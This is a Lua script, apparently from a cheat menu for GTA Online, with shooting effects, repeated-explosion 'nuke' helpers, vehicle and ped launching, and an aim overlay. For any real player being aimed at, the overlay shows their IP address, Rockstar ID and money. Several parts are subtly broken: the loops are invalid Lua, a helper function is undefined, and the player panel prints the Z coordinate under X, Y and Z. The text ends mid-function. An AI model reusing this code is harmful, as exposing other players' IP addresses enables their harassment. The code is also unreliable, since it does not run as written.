menu.divider(weapons, "Effects")

---@class ShootEffect: Effect
local ShootEffect =
{
	scale = 0,
	---@type v3
	rotation = nil
}
ShootEffect.__index = ShootEffect
setmetatable(ShootEffect, Effect)

function ShootEffect.new(asset, name, scale, rotation)
	tbl = setmetatable({}, ShootEffect)
	tbl.name = name
	tbl.asset = asset
	tbl.scale = scale or 1.0
	tbl.rotation = rotation or v3.new()
	return tbl
end

local selectedOpt = 1
---@type ShootEffect[]
local shootingEffects <const> = {
    ShootEffect.new("scr_powerplay", "sp_powerplay_beast_appear_trails", 0.8, v3.new(90, 0.0, 0.0)),
	ShootEffect.new("scr_rcbarry2", "muz_clown", 0.8, v3.new(90, 0.0, 0.0)),
	ShootEffect.new("scr_rcbarry2", "scr_clown_bul", 0.3, v3.new(180.0, 0.0, 0.0)),
    ShootEffect.new("core", "ent_dst_inflate_ball", 0.8, v3.new(90, 0.0, 0.0)),
	ShootEffect.new("core", "ent_anim_paparazzi_flash", 0.004, v3.new(10.0, 0.0, 0.0)),
    ShootEffect.new("core", "exp_grd_petrol_pump", 0.01, v3.new(0.0, 0.0, 0.0)),
	ShootEffect.new("core", "ent_sht_electrical_box", 0.4, v3.new(180.0, 0.0, 0.0)),
	ShootEffect.new("scr_indep_fireworks", "scr_indep_firework_sparkle_spawn", 0.1, v3.new(180.0, 75.0, 0.0)),
    ShootEffect.new("scr_indep_fireworks", "scr_indep_firework_starburs", 0.1, v3.new(180.0, 90.0, 0.0)),
    ShootEffect.new("scr_ie_expor", "scr_ie_export_package_flare", 0.1, v3.new(180.0, 90.0, 0.0))
}

menu.toggle_loop(weapons, "Shooting Effect", {"shootingfx"}, "", function ()
	local effect = shootingEffects[selectedOpt]
	if not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(effect.asset) then
		STREAMING.REQUEST_NAMED_PTFX_ASSET(effect.asset)

	elseif PED.IS_PED_SHOOTING(players.user_ped()) then
		local weapon = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(players.user_ped(), 0)
		local boneId = ENTITY.GET_ENTITY_BONE_INDEX_BY_NAME(weapon, "gun_muzzle")
		GRAPHICS.USE_PARTICLE_FX_ASSET(effect.asset)
		GRAPHICS.START_PARTICLE_FX_NON_LOOPED_ON_ENTITY_BONE(
			effect.name,
			weapon,
			0.0, 0.0, 0.0,
			effect.rotation.x, effect.rotation.y, effect.rotation.z,
			boneId,
			effect.scale,
			false, false, false
		)
	end
end)

local options <const> = {
     "White Stuff",
	 "Clown Muzzle",
	 "Clown Flowers",
     "Dust",
	 "Paparazzi Flash",
     "Small Flames/Explosions",
	 "Smoke/Electric",
	 "Sparkles",
     "Fireworks",
     "Firworks 2"
}
menu.textslider(weapons, "Set Shooting Effect", {}, "", options, function (index)
	selectedOpt = index
end)

menu.divider(weapons, "Other")

---------------------------------------------------------------------------------------------------------------------
--Aim Info
--Taken From NovaScript

local ent_func = {}

function ent_func.get_distance_between(pos1, pos2)
	if math.type(pos1) == "integer" then
		pos1 = ENTITY.GET_ENTITY_COORDS(pos1)
	end
	if math.type(pos2) == "integer" then 
		pos2 = ENTITY.GET_ENTITY_COORDS(pos2)
	end
	return pos1:distance(pos2)
end

function ent_func.get_entity_player_is_aiming_at(player)
	if not PLAYER.IS_PLAYER_FREE_AIMING(player) then
		return 0
	end
	local entity = false
    local aimed_entity = memory.alloc_int()
	if PLAYER.GET_ENTITY_PLAYER_IS_FREE_AIMING_AT(player, aimed_entity) then
		entity = memory.read_int(aimed_entity)
	end
	if entity != false and ENTITY.IS_ENTITY_A_PED(entity) and PED.IS_PED_IN_ANY_VEHICLE(entity, false) then
		entity = PED.GET_VEHICLE_PED_IS_IN(entity, false)
	end
	return entity
end

--credit to lance for this--
function ent_func.get_offset_from_gameplay_camera(distance)
	local cam_rot = CAM.GET_GAMEPLAY_CAM_ROT(0)
	local cam_pos = CAM.GET_GAMEPLAY_CAM_COORD()
	local direction = v3.toDir(cam_rot)
	local destination = {
	  x = cam_pos.x + direction.x * distance,
	  y = cam_pos.y + direction.y * distance,
	  z = cam_pos.z + direction.z * distance
	}
	return destination
end

--upgraded version of my get model height function--
function ent_func.get_model_dimensions(hash)
    local minimum = memory.alloc(24)
    local maximum = memory.alloc(24)
    local min = {}
    local max = {}
    MISC.GET_MODEL_DIMENSIONS(hash, minimum, maximum)
    min.x, min.y, min.z = v3.get(minimum)
    max.x, max.y, max.z = v3.get(maximum)
    local size = {}
    size.x = max.x - min.x
    size.y = max.y - min.y
    size.z = max.z - min.z
    return size
end

--both draw line from x to x not used but just here--
function ent_func.draw_line_from_ped_to_ped(ped)
    local pos_player = PED.GET_PED_BONE_COORDS(ped, 31086, 0.0, 0.0, 0.0)
    local pos_user = PED.GET_PED_BONE_COORDS(players.user_ped(), 31086, 0.0, 0.0, 0.0)
    GRAPHICS.DRAW_LINE(pos_player.x, pos_player.y, pos_player.z, pos_user.x, pos_user.y, pos_user.z, 255, 255, 255, 255)
end

function ent_func.draw_line_from_ped_to_entity(entity)
    local pos_entity = ENTITY.GET_ENTITY_COORDS(entity)
    local pos_user = PED.GET_PED_BONE_COORDS(players.user_ped(), 31086, 0.0, 0.0, 0.0)
    GRAPHICS.DRAW_LINE(pos_entity.x, pos_entity.y, pos_entity.z, pos_user.x, pos_user.y, pos_user.z, 255, 255, 255, 255)
end

function ent_func.request_model(hash)
    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do util.yield() end
end

function ent_func.use_fx_asset(asset)
    while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(asset) do
		STREAMING.REQUEST_NAMED_PTFX_ASSET(asset)
		util.yield()
	end
    GRAPHICS.USE_PARTICLE_FX_ASSET(asset)
end

function ent_func.has_anim_dict_loaded(dict)
    while not STREAMING.HAS_ANIM_DICT_LOADED(dict) do
        STREAMING.REQUEST_ANIM_DICT(dict)
        util.yield()
    end
end

--thanks to soulreaper for this--
function ent_func.any_passengers(vehicle)
    for seatindex = -1, (VEHICLE.GET_VEHICLE_MODEL_NUMBER_OF_SEATS(ENTITY.GET_ENTITY_MODEL(vehicle)) - 2) do
        if not VEHICLE.IS_VEHICLE_SEAT_FREE(vehicle, seatindex, false) then
            return true
        end
    end
    return false
end

--also agian thanks to soulreaper for this--
function ent_func.get_passengers(vehicle)
    local pedtable = {}
    for seatindex = -1, (VEHICLE.GET_VEHICLE_MODEL_NUMBER_OF_SEATS(ENTITY.GET_ENTITY_MODEL(vehicle)) -2) do
        if not VEHICLE.IS_VEHICLE_SEAT_FREE(vehicle, seatindex, false) then
            local ped = VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, seatindex, false)
            local passenger = {seat = seatindex, ped = ped}
            table.insert(pedtable, passenger)
        end
    end
    return pedtable
end

function ent_func.draw_rect_with_text(x, y, text_amound, width, colour)
    local total_text_height = 0
    local one_text_height = 0.01874 + 0.007
    
    for i = 1, text_amound do
        total_text_height = total_text_height + one_text_height
    end

    local draw_rect = directx.draw_rect(x - 0.0045, y - 0.0045, width, total_text_height, colour)
    
    return draw_rect
end

--FUNCTIONS FROM NOVALAY--

function ent_func.draw_info_text(text, infotext, posX, posY, distance, size1, size2, bool)
    local draw_text = directx.draw_text(posX, posY, text, ALIGN_TOP_LEFT, size1, {r = 1, g = 1, b = 1, a = 1.0}, true)

    local first_text_width, first_text_height = directx.get_text_size(text, size1)
    
    local posX2, alignment
    local posY2 = posY + (first_text_height/1.9)
    if bool then
        posX2 = posX - (-distance/1000)
        alignment = ALIGN_CENTRE_RIGHT
    else
        posX2 = posX + first_text_width + (distance/1000)
        alignment = ALIGN_CENTRE_LEFT
    end
    
    local draw_infotext = directx.draw_text(posX2, posY2, infotext, alignment, size2, {r = 160/255, g = 160/255, b = 160/255, a = 1.0}, true)
    
    return draw_text, draw_infotext
end

--shamelessly stolen from lance that stole it from keks--
function ent_func.dec_to_ipv4(ip)
	return string.format(
		"%i.%i.%i.%i", 
		ip >> 24 & 0xFF, 
		ip >> 16 & 0xFF, 
		ip >> 8  & 0xFF, 
		ip 		 & 0xFF
	)
end

--weapon function--
all_weapons = {}
temp_weapons = util.get_weapons()
-- create a table with just weapon hashes, labels
for a,b in pairs(temp_weapons) do
    all_weapons[#all_weapons + 1] = {hash = b['hash'], label_key = b['label_key']}
end
function ent_func.get_weapon_name_from_hash(hash) 
    for k,v in pairs(all_weapons) do 
        if v.hash == hash then 
            return util.get_label_text(v.label_key)
        end
    end
    return "Unarmed"
end

function ent_func.bool(bool)
    if bool then
        return "Yes"
    else
        return "No"
    end
end

function ent_func.check(info)
    if info == nil or info == "NULL" or info == 0 or info == " " then
        return "None"
    else
        return info
    end
end

function ent_func.queuecheck(info)
    if info == nil or info == "NULL" or info == " " then
        return 0
    else
        return "#" .. info
    end
end

function ent_func.org(org_type)
    if org_type == -1 then
        return "Isn't in any"
    elseif org_type == 0 then
        return "CEO"
    else
        return "MC"
    end
end

function ent_func.round(num, dp)
    local mult = 10^(dp or 0)
    return math.floor(num * mult + 0.5) / mult
end

--dont ask please--
function ent_func.formatMoney(money)
    if money >= 1000 and money < 999950 then
        return round(money / 1000, 1) .. "K"
    elseif money >= 999950 and money < 999999950 then
        return round(money / 1000000, 1) .. "M"
    elseif money >= 999999950 then
        return round(money / 1000000000, 1) .. "B"
    else return money
    end
end
--END FUNCTIONS FROM NOVALAY--

--nuke explosion function please dont say anything i know this is a mess but its better the the original function from "my" meteor script bc i took the time to make it a bit smaller--
local function nuke_expl1(Position)
    local offsets = {
        {10, 0, 0}, {0, 10, 0}, {10, 10, 0}, {-10, 0, 0}, {0, -10, 0}, {-10, -10, 0}, {10, -10, 0}, {-10, 10, 0},
        {20, 0, 0}, {0, 20, 0}, {20, 20, 0}, {-20, 0, 0}, {0, -20, 0}, {-20, -20, 0}, {20, -20, 0}, {-20, 10, 0},
        {30, 0, 0}, {0, 30, 0}, {30, 30, 0}, {-30, 0, 0}, {0, -30, 0}, {-30, -30, 0}, {30, -30, 0}, {-30, 10, 0},
        {10, 30, 0}, {30, 10, 0}, {-30, -10, 0}, {-10, -30, 0}, {-10, 30, 0}, {-30, 10, 0}, {30, -10, 0}, {10, -30, 0},
        {0, 0, 10}, {0, 0, -10}, {0, 0, 20}, {0, 0, -20}
    }
    for i, offset in offsets do
        FIRE.ADD_EXPLOSION(Position.x + offset[1], Position.y + offset[2], Position.z + offset[3], 59, 1.0, true, false, 1.0, false)
    end
end

local function nuke_expl2(Position)
    local offsets = {{0,0,-10}, {10,0,-10}, {0,10,-10}, {10,10,-10}, {-10,0,-10}, {0,-10,-10}, {-10,-10,-10}, {10,-10,-10}, {-10,10,-10}}
    for i, offset in offsets do
        FIRE.ADD_EXPLOSION(Position.x + offset[1], Position.y + offset[2], Position.z + offset[3], 59, 1.0, true, false, 1.0, false)
    end
end

local function nuke_expl3(Position)
    local offsets = {{10,0,0}, {0,10,0}, {10,10,0}, {-10,0,0}, {0,-10,0}, {-10,-10,0}, {10,-10,0}, {-10,10,0}, {0,0,0}}
    for i, offset in offsets do
        FIRE.ADD_EXPLOSION(Position.x + offset[1], Position.y + offset[2], Position.z + offset[3], 59, 1.0, true, false, 1.0, false)
    end
end

local relationships = {
    [0] = "Companion",
    [1] = "Respect",
    [2] = "Like",
    [3] = "Neutral",
    [4] = "Dislike",
    [5] = "Hate",
    [255] = "Pedestrians",
}

local languages = {
    [0] = "English",
    [1] = "French",
    [2] = "German",
    [3] = "Italian",
    [4] = "Spanish",
    [5] = "Brazilian",
    [6] = "Polish",
    [7] = "Russian",
    [8] = "Korean",
    [9] = "Chinese",
    [10] = "Japanese",
    [11] = "Mexican",
    [12] = "Chinese",
}

local seat_names = {
    [-1] = "Driver",
    [0] = "Front Right",
    [1] = "Back Left",
    [2] = "Back Right",
    [3] = "Further Back Left",
    [4] = "Further Back Right",
}

menu.toggle_loop(weapons, "Aim Information", {}, "", function()
    if PLAYER.IS_PLAYER_FREE_AIMING(players.user()) then
        entity = ent_func.get_entity_player_is_aiming_at(players.user())

        if ENTITY.IS_ENTITY_A_PED(entity) and not PED.IS_PED_A_PLAYER(entity) then --ped, not in a vehicle, not a player--
            local coords = ENTITY.GET_ENTITY_COORDS(entity)
            local speed = ENTITY.GET_ENTITY_SPEED(entity)
            local mph = speed * 2.236936
            local distance = ent_func.get_distance_between(players.user_ped(), entity)
            local health, maxhealth = ENTITY.GET_ENTITY_HEALTH(entity), ENTITY.GET_ENTITY_MAX_HEALTH(entity)
            local relationship = PED.GET_RELATIONSHIP_BETWEEN_PEDS(entity, players.user_ped())
            local relationshipname = relationships[relationship]
            ent_func.draw_rect_with_text(0.52, 0.35, 10, 0.14, {r = 0/255, g = 0/255, b = 0/255, a = 175/255})
            ent_func.draw_info_text("Name:", util.reverse_joaat(ENTITY.GET_ENTITY_MODEL(entity)), 0.52, 0.35, 130, 0.45, 0.44, true)
            ent_func.draw_info_text("Hash:", ENTITY.GET_ENTITY_MODEL(entity), 0.52, 0.375, 130, 0.45, 0.44, true)
            ent_func.draw_info_text("Distance:", math.ceil(distance) .. "m", 0.52, 0.40, 130, 0.45, 0.44, true)
            ent_func.draw_info_text("Speed:", math.ceil(mph) .. " MPH", 0.52, 0.425, 130, 0.45, 0.44, true)
            ent_func.draw_info_text("Health:", health .. "/" .. maxhealth, 0.52, 0.45, 130, 0.45, 0.44, true)
            ent_func.draw_info_text("Relationship group:", PED.GET_PED_RELATIONSHIP_GROUP_HASH(entity), 0.52, 0.475, 130, 0.45, 0.44, true)
            ent_func.draw_info_text("Ped Relationship:", relationshipname, 0.52, 0.50, 130, 0.45, 0.44, true)
            ent_func.draw_info_text("Coord X:", string.format("%.3f", coords.x), 0.52, 0.525, 130, 0.45, 0.44, true)
            ent_func.draw_info_text("Coord Y:", string.format("%.3f", coords.y), 0.52, 0.55, 130, 0.45, 0.44, true)
            ent_func.draw_info_text("Coord Z:", string.format("%.3f", coords.z), 0.52, 0.575, 130, 0.45, 0.44, true)
        end

        if ENTITY.IS_ENTITY_A_PED(entity) and PED.IS_PED_A_PLAYER(entity) then --ped, not in a vehicle, player-
            local player_id = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(entity)

            local name = players.get_name(player_id)
            local RID = players.get_rockstar_id(player_id)
            local IP = ent_func.dec_to_ipv4(players.get_connect_ip(player_id))
            local rank = ent_func.check(players.get_rank(player_id))
            local kd = ent_func.round(players.get_kd(player_id), 2)
            local lang = languages[players.get_language(player_id)]
            local controller = ent_func.bool(players.is_using_controller(player_id))
            local host = ent_func.bool(player_id == players.get_host())
            local script_host = ent_func.bool(player_id == players.get_script_host())
            local host_queue = ent_func.queuecheck(players.get_host_queue_position(player_id))

            local org_type = ent_func.org(players.get_org_type(player_id))
            local distance = ent_func.get_distance_between(players.user_ped(), entity)
            local speed = ENTITY.GET_ENTITY_SPEED(entity)
            local mph = speed * 2.236936
            local health, maxhealth = ENTITY.GET_ENTITY_HEALTH(entity), ENTITY.GET_ENTITY_MAX_HEALTH(entity)
            local armor, maxarmor = PED.GET_PED_ARMOUR(entity), PLAYER.GET_PLAYER_MAX_ARMOUR(player_id)
            local godmode = ent_func.bool(players.is_godmode(player_id))
            local otr = ent_func.bool(players.is_otr(player_id)) 
            local weapon_hash = WEAPON.GET_SELECTED_PED_WEAPON(entity)
            local weapon =  ent_func.get_weapon_name_from_hash(weapon_hash)
            local coords = ENTITY.GET_ENTITY_COORDS(entity)

            local wanted_lvl, max_wanted_lvl = PLAYER.GET_PLAYER_WANTED_LEVEL(player_id), PLAYER.GET_MAX_WANTED_LEVEL(player_id)
            local atk_you = ent_func.bool(players.is_marked_as_attacker(player_id))
            local mod_or_ad = ent_func.bool(players.is_marked_as_modder_or_admin(player_id))
            local totalmoney = ent_func.formatMoney(players.get_money(player_id))
            local walletmoney = ent_func.formatMoney(players.get_wallet(player_id))
            local bankmoney = ent_func.formatMoney(players.get_bank(player_id))
            local tags = ent_func.check(players.get_tags_string(player_id))

            ent_func.draw_rect_with_text(0.52, 0.35, 10, 0.14, {r = 0/255, g = 0/255, b = 0/255, a = 175/255})
            ent_func.draw_info_text("Name:", name, 0.52, 0.35, 130, 0.45, 0.44, true)
            ent_func.draw_info_text("RID:", RID, 0.52, 0.375, 130, 0.45, 0.44, true)
            ent_func.draw_info_text("IP:", IP, 0.52, 0.40, 130, 0.45, 0.44, true)
            ent_func.draw_info_text("Rank:", rank, 0.52, 0.425, 130, 0.45, 0.44, true)
            ent_func.draw_info_text("K/D:", kd, 0.52, 0.45, 130, 0.45, 0.44, true)
            ent_func.draw_info_text("Language:", lang, 0.52, 0.475, 130, 0.45, 0.44, true)
            ent_func.draw_info_text("Controller:", controller, 0.52, 0.50, 130, 0.45, 0.44, true)
            ent_func.draw_info_text("Host:", host, 0.52, 0.525, 130, 0.45, 0.44, true)
            ent_func.draw_info_text("Script host:", script_host, 0.52, 0.55, 130, 0.45, 0.44, true)
            ent_func.draw_info_text("Host queue:", host_queue, 0.52, 0.575, 130, 0.45, 0.44, true)

            ent_func.draw_rect_with_text(0.665, 0.35, 11, 0.14, {r = 0/255, g = 0/255, b = 0/255, a = 175/255})
            ent_func.draw_info_text("Org:", org_type, 0.665, 0.35, 130, 0.45, 0.44, true)
            ent_func.draw_info_text("Distance:", math.ceil(distance) .. "m", 0.665, 0.375, 130, 0.45, 0.44, true)
            ent_func.draw_info_text("Speed:", math.ceil(mph) .. " MPH", 0.665, 0.40, 130, 0.45, 0.44, true)
            ent_func.draw_info_text("Health:", health .. "/" .. maxhealth, 0.665, 0.425, 130, 0.45, 0.44, true)
            ent_func.draw_info_text("Armor:", armor .. "/" .. maxarmor, 0.665, 0.45, 130, 0.45, 0.44, true)
            ent_func.draw_info_text("Godmode:", godmode, 0.665, 0.475, 130, 0.45, 0.44, true)
            ent_func.draw_info_text("Off the radar:", otr, 0.665, 0.50, 130, 0.45, 0.44, true)
            ent_func.draw_info_text("Weapon:", weapon, 0.665, 0.525, 130, 0.45, 0.44, true)
            ent_func.draw_info_text("Coord X:", string.format("%.3f", coords.z), 0.665, 0.55, 130, 0.45, 0.44, true)
            ent_func.draw_info_text("Coord Y:", string.format("%.3f", coords.z), 0.665, 0.575, 130, 0.45, 0.44, true)
            ent_func.draw_info_text("Coord Z:", string.format("%.3f", coords.z), 0.665, 0.60, 130, 0.45, 0.44, true)


            ent_func.draw_rect_with_text(0.81, 0.35, 8, 0.14, {r = 0/255, g = 0/255, b = 0/255, a = 175/255})
            ent_func.draw_info_text("Wanted level:", wanted_lvl .. "/" .. max_wanted_lvl, 0.81, 0.35, 130, 0.45, 0.44, true)
            ent_func.draw_info_text("Atk you:", atk_you, 0.81, 0.375, 130, 0.45, 0.44, true)
            ent_func.draw_info_text("Mod or Admin:", mod_or_ad, 0.81, 0.40, 130, 0.45, 0.44, true)
            ent_func.draw_info_text("Total:", totalmoney, 0.81, 0.425, 130, 0.45, 0.44, true)
            ent_func.draw_info_text("Wallet:", walletmoney, 0.81, 0.45, 130, 0.45, 0.44, true)
            ent_func.draw_info_text("Bank:", bankmoney, 0.81, 0.475, 130, 0.45, 0.44, true)

            ent_func.draw_info_text("Tags:", tags, 0.81, 0.525, 130, 0.45, 0.44, true)
        end

        if ENTITY.IS_ENTITY_A_VEHICLE(entity) then --vehicle--
            local coords = ENTITY.GET_ENTITY_COORDS(entity)
            local distance = ent_func.get_distance_between(players.user_ped(), entity)
            local speed = ENTITY.GET_ENTITY_SPEED(entity)
            local mph = speed * 2.236936
            local rpm = entities.get_rpm(entities.handle_to_pointer(entity)) * 6000
            local engine_health = VEHICLE.GET_VEHICLE_ENGINE_HEALTH(entity)+4000
            local body_health = VEHICLE.GET_VEHICLE_BODY_HEALTH(entity)
            local passengers = ent_func.get_passengers(entity)
            local passengers_num = #passengers
            if ent_func.any_passengers(entity) then
                passengers_num = #passengers + 1
            end
            ent_func.draw_rect_with_text(0.52, 0.35, 10 + passengers_num, 0.14, {r = 0/255, g = 0/255, b = 0/255, a = 175/255})
            ent_func.draw_info_text("Name:", util.reverse_joaat(ENTITY.GET_ENTITY_MODEL(entity)), 0.52, 0.35, 130, 0.45, 0.44, true)
            ent_func.draw_info_text("Hash:", ENTITY.GET_ENTITY_MODEL(entity), 0.52, 0.375, 130, 0.45, 0.44, true)
            ent_func.draw_info_text("Speed:", math.ceil(mph) .. " MPH", 0.52, 0.40, 130, 0.45, 0.44, true)
            ent_func.draw_info_text("RPM:", math.ceil(rpm) .. " RPM", 0.52, 0.425, 130, 0.45, 0.44, true)
            ent_func.draw_info_text("Engine health:", math.floor((engine_health/5000) * 100) .. "%", 0.52, 0.45, 130, 0.45, 0.44, true)
            ent_func.draw_info_text("Body health:", math.floor((body_health/1000) * 100) .. "%", 0.52, 0.475, 130, 0.45, 0.44, true)
            ent_func.draw_info_text("Distance:", math.ceil(distance) .. "m", 0.52, 0.50, 130, 0.45, 0.44, true)
            ent_func.draw_info_text("Coord X:", string.format("%.3f", coords.x), 0.52, 0.525, 130, 0.45, 0.44, true)
            ent_func.draw_info_text("Coord Y:", string.format("%.3f", coords.y), 0.52, 0.55, 130, 0.45, 0.44, true)
            ent_func.draw_info_text("Coord Z:", string.format("%.3f", coords.z), 0.52, 0.575, 130, 0.45, 0.44, true)
            if ent_func.any_passengers(entity) then
                local pos_y = 0.625
                for i = 1, #passengers do
                    local seat = passengers[i].seat
                    local seat_name = seat_names[seat]
                    local ped = tostring(passengers[i].ped)
                    local ped_name = ped
                    local label_text = "Seat, Ped:"
                    if PED.IS_PED_A_PLAYER(ped) then
                        local player_id = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(ped)
                        ped_name = players.get_name(player_id)
                        label_text = "Seat, Player:"

                        local name = players.get_name(player_id)
                        local RID = players.get_rockstar_id(player_id)
                        local IP = ent_func.dec_to_ipv4(players.get_connect_ip(player_id))
                        local rank = ent_func.check(players.get_rank(player_id))
                        local kd = ent_func.round(players.get_kd(player_id), 2)
                        local lang = languages[players.get_language(player_id)]
                        local controller = ent_func.bool(players.is_using_controller(player_id))
                        local host = ent_func.bool(player_id == players.get_host())
                        local script_host = ent_func.bool(player_id == players.get_script_host())
                        local host_queue = ent_func.queuecheck(players.get_host_queue_position(player_id))
            
                        local org_type = ent_func.org(players.get_org_type(player_id))
                        local health, maxhealth = ENTITY.GET_ENTITY_HEALTH(ped), ENTITY.GET_ENTITY_MAX_HEALTH(ped)
                        local armor, maxarmor = PED.GET_PED_ARMOUR(ped), PLAYER.GET_PLAYER_MAX_ARMOUR(player_id)
                        local godmode = ent_func.bool(players.is_godmode(player_id))
                        local otr = ent_func.bool(players.is_otr(player_id)) 
                        local weapon_hash = WEAPON.GET_SELECTED_PED_WEAPON(ped)
                        local weapon = ent_func.get_weapon_name_from_hash(weapon_hash)
            
                        local wanted_lvl, max_wanted_lvl = PLAYER.GET_PLAYER_WANTED_LEVEL(player_id), PLAYER.GET_MAX_WANTED_LEVEL(player_id)
                        local atk_you = ent_func.bool(players.is_marked_as_attacker(player_id))
                        local mod_or_ad = ent_func.bool(players.is_marked_as_modder_or_admin(player_id))
                        local totalmoney = ent_func.formatMoney(players.get_money(player_id))
                        local walletmoney = ent_func.formatMoney(players.get_wallet(player_id))
                        local bankmoney = ent_func.formatMoney(players.get_bank(player_id))
                        local tags = ent_func.check(players.get_tags_string(player_id))
            
                        ent_func.draw_rect_with_text(0.665, 0.35, 10, 0.14, {r = 0/255, g = 0/255, b = 0/255, a = 175/255})
                        ent_func.draw_info_text("Name:", name, 0.665, 0.35, 130, 0.45, 0.44, true)
                        ent_func.draw_info_text("RID:", RID, 0.665, 0.375, 130, 0.45, 0.44, true)
                        ent_func.draw_info_text("IP:", IP, 0.665, 0.40, 130, 0.45, 0.44, true)
                        ent_func.draw_info_text("Rank:", rank, 0.665, 0.425, 130, 0.45, 0.44, true)
                        ent_func.draw_info_text("K/D:", kd, 0.665, 0.45, 130, 0.45, 0.44, true)
                        ent_func.draw_info_text("Language:", lang, 0.665, 0.475, 130, 0.45, 0.44, true)
                        ent_func.draw_info_text("Controller:", controller, 0.665, 0.50, 130, 0.45, 0.44, true)
                        ent_func.draw_info_text("Host:", host, 0.665, 0.525, 130, 0.45, 0.44, true)
                        ent_func.draw_info_text("Script host:", script_host, 0.665, 0.55, 130, 0.45, 0.44, true)
                        ent_func.draw_info_text("Host queue:", host_queue, 0.665, 0.575, 130, 0.45, 0.44, true)
            
                        ent_func.draw_rect_with_text(0.81, 0.35, 7, 0.14, {r = 0/255, g = 0/255, b = 0/255, a = 175/255})
                        ent_func.draw_info_text("Org:", org_type, 0.81, 0.35, 130, 0.45, 0.44, true)
                        ent_func.draw_info_text("Distance:", math.ceil(distance) .. "m", 0.81, 0.375, 130, 0.45, 0.44, true)
                        ent_func.draw_info_text("Health:", health .. "/" .. maxhealth, 0.81, 0.40, 130, 0.45, 0.44, true)
                        ent_func.draw_info_text("Armor:", armor .. "/" .. maxarmor, 0.81, 0.425, 130, 0.45, 0.44, true)
                        ent_func.draw_info_text("Godmode:", godmode, 0.81, 0.45, 130, 0.45, 0.44, true)
                        ent_func.draw_info_text("Off the radar:", otr, 0.81, 0.475, 130, 0.45, 0.44, true)
                        ent_func.draw_info_text("Weapon:", weapon, 0.81, 0.50, 130, 0.45, 0.44, true)
            
            
                        ent_func.draw_rect_with_text(0.665, 0.615, 8, 0.14, {r = 0/255, g = 0/255, b = 0/255, a = 175/255})
                        ent_func.draw_info_text("Wanted level:", wanted_lvl .. "/" .. max_wanted_lvl, 0.665, 0.615, 130, 0.45, 0.44, true)
                        ent_func.draw_info_text("Atk you:", atk_you, 0.665, 0.640, 130, 0.45, 0.44, true)
                        ent_func.draw_info_text("MOd or Admin:", mod_or_ad, 0.665, 0.665, 130, 0.45, 0.44, true)
                        ent_func.draw_info_text("Total:", totalmoney, 0.665, 0.690, 130, 0.45, 0.44, true)
                        ent_func.draw_info_text("Wallet:", walletmoney, 0.665, 0.715, 130, 0.45, 0.44, true)
                        ent_func.draw_info_text("Bank:", bankmoney, 0.665, 0.740, 130, 0.45, 0.44, true)
            
                        ent_func.draw_info_text("Tags:", tags, 0.665, 0.790, 130, 0.45, 0.44, true)
                    end
                    ent_func.draw_info_text(label_text, seat_name .. ", " .. ped_name, 0.52, pos_y, 130, 0.45, 0.44, true)
                    pos_y = pos_y + 0.025
                end
            end
        end

        if ENTITY.IS_ENTITY_AN_OBJECT(entity) then --object--
            local coords = ENTITY.GET_ENTITY_COORDS(entity)
            ent_func.draw_rect_with_text(0.52, 0.35, 6, 0.14, {r = 0/255, g = 0/255, b = 0/255, a = 175/255})
            ent_func.draw_info_text("Name:", util.reverse_joaat(ENTITY.GET_ENTITY_MODEL(entity)), 0.52, 0.35, 130, 0.45, 0.44, true)
            ent_func.draw_info_text("Hash:", ENTITY.GET_ENTITY_MODEL(entity), 0.52, 0.375, 130, 0.45, 0.44, true)
            ent_func.draw_info_text("Pickup:", ent_func.bool(OBJECT.IS_OBJECT_A_PICKUP(entity)), 0.52, 0.40, 130, 0.45, 0.44, true)
            ent_func.draw_info_text("Coord X:", string.format("%.3f", coords.x), 0.52, 0.425, 130, 0.45, 0.44, true)
            ent_func.draw_info_text("Coord Y:", string.format("%.3f", coords.y), 0.52, 0.45, 130, 0.45, 0.44, true)
            ent_func.draw_info_text("Coord Z:", string.format("%.3f", coords.z), 0.52, 0.475, 130, 0.45, 0.44, true)
        end
	end
end)

--------------------------------------------------------------------------------------------------------------------------------------

function wait_session_transition(yield_time)
    yield_time = yield_time or 1000

    while util.is_session_transition_active() do
        util.yield(yield_time)
    end
end

menu.toggle(weapons, "Autoload Weapons", {"autoloadweapons"}, "Autoload all the weapons everytime you join a new session.", function(state)
    if state then
        players.on_join(function(player_id)
            local my_player_id <const> = players.user()

            if player_id == my_player_id then
                local all_weapons_command_ref <const> = menu.ref_by_path("Self>Weapons>Get Weapons>All Weapons")

                wait_session_transition()
                menu.trigger_command(all_weapons_command_ref)
                --util.toast("Weapons loaded successfully. :)")
            end
        end)
    end
end)

function ACutil(text)
    return util.toast(text)
end

local objtab = {}
local vsh
local psh
local obj_shot
local function vshot(hash, camcoords, CV, rot)
    if not ENTITY.DOES_ENTITY_EXIST(vsh) then
        vsh = entities.create_vehicle(hash, camcoords, CV)
        ENTITY.SET_ENTITY_ROTATION(vsh, rot.x, rot.y, rot.z, 0, true)
        VEHICLE.SET_VEHICLE_FORWARD_SPEED(vsh, 1000)
        VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(vsh, true)
        VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_NON_SCRIPT_PLAYERS(vsh, true)
        table.insert(objtab, vsh)
    else
        local veh_sec = entities.create_vehicle(hash, camcoords, CV)
        ENTITY.SET_ENTITY_ROTATION(veh_sec, rot.x, rot.y, rot.z, 0, true)
        VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh_sec, 1000)
        VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(vsh, true)
        VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_NON_SCRIPT_PLAYERS(vsh, true)
        table.insert(objtab, veh_sec)
    end
end

local function pshot(hash, camcoords, CV, rot)
    if not ENTITY.DOES_ENTITY_EXIST(psh) then
        psh = entities.create_ped(1, hash, camcoords, CV)
        ENTITY.SET_ENTITY_INVINCIBLE(psh, true)
        util.yield(30)
        ENTITY.SET_ENTITY_ROTATION(psh, rot.x, rot.y, rot.z, 0, true)
        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(psh, 1, 0, 5000, 0, 0, true, true, true, true)
        table.insert(objtab, psh)
    else
